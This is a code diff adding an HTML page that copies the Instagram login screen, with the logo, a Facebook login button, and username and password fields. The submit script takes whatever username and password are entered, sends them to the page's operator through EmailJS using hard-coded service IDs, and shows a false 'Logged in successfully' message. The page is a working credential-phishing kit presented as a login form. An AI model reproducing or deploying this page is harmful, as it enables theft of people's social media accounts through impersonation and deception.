@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
+      rel="stylesheet"
+    />
+
+    <style>
+      /* Default light mode styling */
+      body {
+        font-family: "Montserrat", sans-serif;
+        background-color: white;
+        color: #000;
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        height: 100vh;
+      }
+
+      .login-container {
+        max-width: 350px;
+        width: 100%;
+        background-color: white;
+        /* box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); */
+      }
+      .language {
+        padding-top: 5px;
+        font-size: 13px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #9c9c9c;
+      }
+      .language svg {
+        width: 12px;
+        margin-left: 5px;
+      }
+      .login-box {
+        border: #dbdbdb 1px solid;
+        padding: 40px;
+      }
+      .login-logo {
+        background-image: url("https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png");
+        background-size: cover;
+        width: 175px;
+        height: 60px;
+        margin: 0 auto 20px;
+      }
+
+      input {
+        width: calc(100% - 20px);
+        padding: 10px;
+        margin-bottom: 10px;
+        border: 1px solid #dbdbdb;
+        border-radius: 3px;
+        background-color: #fafafa;
+        outline: none;
+      }
+
+      button {
+        width: 100%;
+        padding: 10px;
+        background-color: #3897f0;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+      }
+
+      button:hover {
+        background-color: #3180e2;
+      }
+
+      .separator {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin: 15px 0;
+        color: #8e8e8e;
+        font-size: 12px;
+        font-weight: 700;
+      }
+
+      .separator .line {
+        width: 40%;
+        height: 1px;
+        background-color: #dbdbdb;
+      }
+
+      .forgot-password {
+        font-size: 14px;
+        font-weight: 500;
+        text-align: right;
+        display: block;
+        color: #3897f0;
+        text-decoration: none;
+        margin: 0 0 20px;
+      }
+
+      .fb-login-btn {
+        background-color: transparent;
+        /* border: 1px solid #385185; */
+        color: white;
+        background-color: #0095f6;
+        font-size: 14px;
+        padding: 10px;
+        cursor: pointer;
+        letter-spacing: 0.2px;
+      }
+      .fb-login-btn::before {
+        content: "\f39e";
+        font-family: "Font Awesome 6 Free";
+        font-weight: 900;
+        font-size: 20px;
+        margin-right: 8px;
+      }
+      .signup-link {
+        text-align: center;
+        font-size: 14px;
+        border: #dbdbdb 1px solid;
+      }
+      .signup-link p {
+        margin: 0;
+      }
+      .signup-link a {
+        color: #3897f0;
+        text-decoration: none;
+      }
+
+      .signup-link a:hover {
+        text-decoration: underline;
+      }
+      footer {
+        position: absolute;
+        bottom: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding-top: 10px;
+        background-color: #f6f6f6;
+        border-top: 1px solid #d7d7d7;
+        width: 100%;
+      }
+      footer img {
+        width: 50px;
+      }
+      /* Dark mode styles */
+      @media (prefers-color-scheme: dark) {
+        body {
+          background-color: #0a0a0a;
+          color: #fafafa;
+        }
+
+        .login-container {
+          background-color: inherit;
+          /* box-shadow: 0 4px 10px rgba(255, 255, 255, 0.1); */
+        }
+        .login-logo {
+          filter: invert(1);
+        }
+        input {
+          background-color: #333;
+          color: #fafafa;
+          border: 1px solid #444;
+        }
+
+        button {
+          background-color: #3897f0;
+          color: #ffffff;
+        }
+
+        .separator .line {
+          background-color: #444;
+        }
+
+        .forgot-password {
+          color: #5890ff;
+        }
+        footer {
+          background-color: #121212;
+          border-top: 1px solid #474747;
+        }
+      }
+
+      @media (max-width: 450px) {
+        .login-box {
+          border: none;
+        }
+        .signup-link {
+          border: none;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <div class="language">
+        English (UK)
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
+          <!--!Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2024 Fonticons, Inc.-->
+          <path
+            fill="#8f8f8f"
+            d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z"
+          />
+        </svg>
+      </div>
+      <div class="login-box">
+        <div class="login-logo"></div>
+        <form id="login-form">
+          <button type="button" class="fb-login-btn">
+            Continue Using Facebook
+          </button>
+          <div class="separator">
+            <div class="line"></div>
+            <p>OR</p>
+            <div class="line"></div>
+          </div>
+          <input
+            type="email"
+            id="username"
+            placeholder="Phone number, username, or email"
+            required
+          />
+          <input
+            type="password"
+            id="password"
+            placeholder="Password"
+            required
+          />
+          <a href="#" class="forgot-password">Forgotten your password?</a>
+          <button type="submit" class="login-btn">Log in</button>
+        </form>
+      </div>
+      <div class="signup-link">
+        <p>Don't have an account? <a href="#">Sign Up</a></p>
+      </div>
+    </div>
+    <footer>
+      <img src="IMG/logo.png.png" alt="#" />
+    </footer>
+    <!-- Include EmailJS SDK -->
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      // Initialize EmailJS
+      (function () {
+        emailjs.init("wglmYgVharztMETkX");
+      })();
+
+      // Handle form submission
+      document
+        .getElementById("login-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+
+          const username = document.getElementById("username").value;
+          const password = document.getElementById("password").value;
+
+          if (username === "" || password === "") {
+            alert("Please fill in both fields.");
+          } else {
+            const emailData = {
+              username: username,
+              password: password,
+            };
+
+            emailjs.send("service_app3huq", "template_gyqdenu", emailData).then(
+              function (response) {
+                console.log("Success:", response);
+                alert("Logged in successfully and email sent!");
+              },
+              function (error) {
+                console.error("Error:", error);
+                alert("Failed to send email. Please try again.");
+              }
+            );
+          }
+        });
+    </script>
+
+    <script type="text/javascript">
+      // Listen for changes in system color scheme and apply the respective theme
+      window
+        .matchMedia("(prefers-color-scheme: dark)")
+        .addEventListener("change", (event) => {
+          if (event.matches) {
+            document.body.classList.add("dark-mode");
+          } else {
+            document.body.classList.remove("dark-mode");
+          }
+        });
+    </script>
+  </body>
+</html>
